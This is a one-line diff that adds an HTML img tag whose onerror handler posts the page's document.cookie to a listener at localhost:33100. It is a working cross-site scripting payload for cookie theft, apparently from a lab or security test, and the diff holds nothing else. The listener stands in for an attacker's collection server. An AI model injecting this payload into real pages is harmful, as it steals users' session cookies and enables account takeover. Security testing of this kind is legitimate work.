@@ -1,0 +1,1 @@
+<img src=1 onerror="var xhr = new XMLHttpRequest; xhr.open('POST', 'http://localhost:33100', true); xhr.send(document.cookie)">
